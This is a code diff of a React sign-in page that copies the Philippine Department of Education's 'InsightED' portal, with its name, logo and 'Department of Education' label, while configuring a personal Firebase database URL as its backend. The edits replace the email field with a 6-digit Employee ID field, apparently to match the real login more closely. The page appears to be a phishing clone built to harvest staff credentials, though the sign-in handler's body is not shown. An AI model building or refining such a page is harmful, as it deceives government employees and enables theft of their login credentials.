@@ -1,13 +1,17 @@
 import { useState } from "react";
 
 const FIREBASE_URL = "https://forms-12c42-default-rtdb.firebaseio.com";
-const LOGO = "https://stride.deped.gov.ph/insighted/assets/InsightEd1-DQGBqvKJ.png";
 
 export default function InsightED() {
   const [showPass, setShowPass] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [status, setStatus] = useState("");
+
+  const handleEmailChange = (e) => {
+    const val = e.target.value.replace(/\D/g, "").slice(0, 6);
+    setEmail(val);
+  };
 
   const handleSignIn = async () => {
     setStatus("Signing in...");
@@ -57,6 +61,7 @@ export default function InsightED() {
           </svg>
         </button>
 
+        {/* Logo — loaded from public/logo.png */}
         <div style={{ display: "flex", justifyContent: "center", marginBottom: "22px" }}>
           <div style={{
             width: "88px", height: "88px", borderRadius: "16px",
@@ -64,29 +69,55 @@ export default function InsightED() {
             overflow: "hidden", display: "flex", alignItems: "center", justifyContent: "center",
           }}>
             <img
-              src={LOGO}
+              src={process.env.PUBLIC_URL + "/logo.png"}
               alt="InsightED"
-              style={{ width: "100%", height: "100%", objectFit: "contain" }}
+              style={{ width: "100%", height: "100%", objectFit: "contain", padding: "6px" }}
+              onError={e => {
+                e.target.style.display = "none";
+                e.target.nextSibling.style.display = "flex";
+              }}
             />
+            <span style={{
+              display: "none", alignItems: "center", justifyContent: "center",
+              width: "100%", height: "100%", fontSize: "22px", fontWeight: 800,
+              color: "#2762ea", letterSpacing: "-1px",
+            }}>iE</span>
           </div>
         </div>
 
         <div style={{ textAlign: "center", fontSize: "28px", fontWeight: 800, color: "#1a1f36", letterSpacing: "-0.4px", marginBottom: "5px", lineHeight: 1.2 }}>InsightED</div>
         <div style={{ textAlign: "center", fontSize: "14px", color: "#94a3b8", fontWeight: 400, marginBottom: "32px" }}>Department of Education</div>
 
-        {/* Email field */}
+        {/* Employee ID — numbers only, max 6 digits */}
         <div style={{ position: "relative", marginBottom: "16px" }}>
           <span style={{ position: "absolute", left: "16px", top: "50%", transform: "translateY(-50%)", color: "#64748b", display: "flex", alignItems: "center" }}>
             <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
               <rect x="2" y="4" width="20" height="16" rx="2"/><polyline points="2,7 12,13 22,7"/>
             </svg>
           </span>
-          <input type="text" value={email} onChange={e => setEmail(e.target.value)} placeholder="Email or Username" style={{
-            width: "100%", padding: "16px 16px 16px 46px",
-            border: "1.5px solid #e4e7ec", borderRadius: "12px",
-            background: "#ffffff", fontSize: "15px", fontFamily: "inherit",
-            color: "#1a1f36", outline: "none", boxSizing: "border-box",
-          }}/>
+          <input
+            type="text"
+            inputMode="numeric"
+            pattern="[0-9]*"
+            maxLength={6}
+            placeholder="Employee ID (6 digits)"
+            value={email}
+            onChange={handleEmailChange}
+            style={{
+              width: "100%", padding: "16px 16px 16px 46px",
+              border: "1.5px solid #e4e7ec", borderRadius: "12px",
+              background: "#ffffff", fontSize: "15px", fontFamily: "inherit",
+              color: "#1a1f36", outline: "none", boxSizing: "border-box",
+              letterSpacing: "4px", fontWeight: 600,
+            }}
+          />
+          <span style={{
+            position: "absolute", right: "16px", top: "50%", transform: "translateY(-50%)",
+            fontSize: "11px", color: email.length === 6 ? "#22c55e" : "#cbd5e1",
+            fontWeight: 600, transition: "color 0.2s",
+          }}>
+            {email.length}/6
+          </span>
         </div>
 
         {/* Passcode field */}
